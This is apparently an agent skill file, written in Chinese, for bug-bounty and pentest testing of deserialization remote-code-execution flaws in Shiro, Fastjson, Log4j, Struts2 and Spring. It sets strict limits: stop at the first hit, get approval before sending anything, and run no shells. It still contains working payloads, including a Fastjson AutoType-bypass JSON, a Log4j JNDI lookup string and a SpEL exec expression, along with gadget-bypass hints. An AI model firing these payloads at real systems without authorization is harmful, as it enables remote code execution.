---
name: deserialization-rce
domain: deserialization|rce
modes: [src, redteam, pentest]
exit_artifacts: [reproduction, impact]
---

# 反序列化 / RCE 深挖（一发入魂，高 ROI）

> **定位**：reflexes 组合指纹触发器只到"投 payload 看 DNSLOG"。本 skill 补**版本→gadget 速查 + 检测→确认→利用分步流程**。

## Domain

- Java 栈：Shiro `rememberMe` / Fastjson `@type` / Log4j `${jndi}` / Struts2 OGNL / Spring SpEL / XStream
- .NET 栈：ViewState / JSON.NET `$type` / BinaryFormatter
- Python 栈：Pickle / YAML.load
- PHP 栈：unserialize / Phar
- 触发条件见 `doctrine/reflexes.md` 组合指纹触发器
- modes: src/redteam 高危（RCE = 一发入魂）；pentest 须授权明确

## Boundaries

- RCE payload 限 `whoami` / `id` / `echo` 无害命令，**命中即停**（law.md §4.1 1 次承诺）
- **不部署内存马/不反弹 shell/不横向**（扩战果须 _PENDING 请示）
- DNSLOG 收到请求 = 证明存在，**不进一步利用**（报告写"存在反序列化 RCE，未实际执行命令"即可）
- 反序列化 payload 是重武器 → **先请示再发**（_PENDING.md）
- Java gadget chain 生成用 ysoserial → danger-guard 会拦，须 `SRCOOP_DANGER_ALLOW=1`

## Pivot Hints

- Shiro `rememberMe` 有响应 → AES-CBC 模式用默认密钥，GCM 模式需找密钥
- Fastjson 1.2.24 前 → `TemplatesImpl` 直接打；1.2.47 前 → `AutoType` 缓存绕过
- Log4j DNSLOG 不通 → 可能出站被拦，试 HTTP 回显 / 延时判断
- Struts2 OGNL → 看 `#` 符号是否被过滤，试 `%23` URL 编码
- Spring SpEL → `T(java.lang.Runtime).getRuntime().exec('id')` 被拦试 `T(java.lang.ProcessBuilder)`

## Exit Evidence

### src
- E2: DNSLOG 收到请求 / HTTP 回显含命令输出 / 延时差异可复现
- E3: `whoami`/`id` 输出截图（证明代码执行，不进一步利用）

## Tactics

### 1. 检测（先识别类型，3-5 包）

#### Shiro
```bash
# 请求带 rememberMe=xxx 看响应是否有 Set-Cookie: rememberMe=deleteMe
curl -sI -b "rememberMe=test" https://target.com/ | grep -i rememberMe
# deleteMe = Shiro 存在
```

#### Fastjson
```bash
# 发 {"@type":"java.net.Inet4Address","val":"<dnslog>"} 看 DNSLOG
# 1.2.47 绕过: {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<dnslog>/x","autoCommit":true}}
```

#### Log4j
```bash
# 见 reflexes.md Log4j 强制触发段，4 个投入点各 1 包
# ${jndi:ldap://<dnslog>/a}
```

### 2. 确认（DNSLOG 回连后，1-2 包）

DNSLOG 收到请求 = 存在反序列化。**不进一步利用**，写报告。

如果需要证明代码执行（部分 SRC 要求）：
```bash
# 无害命令回显（须 _PENDING 请示后）
# Log4j: ${jndi:ldap://<dnslog>/a} → DNSLOG 证明即可
# Shiro: ysoserial CommonsBeanutils1 "whoami" → 看响应/日志回显
# Fastjson: JdbcRowSetImpl → ldap://<dnslog> 证明即可
```

### 3. 版本→gadget 速查

| 组件 | 版本范围 | gadget | 检测特征 |
|---|---|---|---|
| Shiro | <1.2.5 | 默认密钥 AES-CBC | `rememberMe=deleteMe` |
| Shiro | 1.2.5-1.4.1 | 需找密钥（常硬编码） | 同上 |
| Shiro | ≥1.4.2 | AES-GCM，需密钥 | 同上 |
| Fastjson | <1.2.24 | `TemplatesImpl` 直接打 | `@type` 不报错 |
| Fastjson | 1.2.24-1.2.47 | `AutoType` 缓存绕过 | `Class` 诱导 |
| Fastjson | ≥1.2.68 | `safeMode` 可能开 | 需找其他入口 |
| Log4j | 2.0-2.14.1 | JNDI 注入 | DNSLOG 回连 |
| Log4j | ≥2.15.0 | 已修复（部分绕过到 2.17.0） | 需特定配置 |
| Struts2 | S2-057 | OGNL via namespace | `%24` / `#` |
| Spring | Actuator + jolokia | MBean 反序列化 | `/actuator/jolokia` |

### 4. 后利用边界（**须 _PENDING 请示**）

- 命中即停，**不**：内存马/反弹 shell/横向/读文件/拖库
- 扩战果（更深 payload/容器逃逸/横向）→ 必须写 `_PENDING.md` 重新拍板
- odoo killchain 是授权 pentest 场景的完整链式案例，SRC 场景命中即停

## Common misses

- **Shiro 只试默认密钥** → 很多二开改了密钥，需从源码/配置找
- **Fastjson 只试最新 gadget** → 老版本（1.2.24 前）`TemplatesImpl` 直接打，不需要绕 AutoType
- **Log4j DNSLOG 不通就放弃** → 可能出站被拦，试 HTTP 回显 / 延时（`${jndi:ldap://<delay-server>/x}`）
- **不区分检测和利用** → DNSLOG 回连 = 检测到，不需要进一步利用就够报 SRC
- **payload 发太多** → 反序列化是重武器，1 次命中即停（1 次承诺）

## Verification

- **verified**：DNSLOG 收到请求 / 回显含命令输出 / 延时可复现
- **phenomenon**：组件存在但 payload 不触发（已修复/版本不对）
- **rejected**：无该组件 / 组件存在但 safeMode 开启

## ⚠️ 红线

- **先请示再发**（_PENDING.md），反序列化 payload 是重武器
- `whoami`/`id`/`echo` 命中即停，**不进一步利用**
- 不部署内存马/不反弹 shell/不横向
- ysoserial 等工具 → `SRCOOP_DANGER_ALLOW=1` + timeline 留痕

## Related

- `doctrine/reflexes.md` 组合指纹触发器 — Java+用户输入→必测 Log4j/Fastjson/Shiro
- `doctrine/reflexes.md` Log4j 强制触发段 — 4 个投入点
- `skills/chain-playbook.md` 链 2 — 任意文件读→源码→审计→注入（RCE 的另一条路径）
- odoo killchain — 授权 pentest 完整 RCE 链式案例
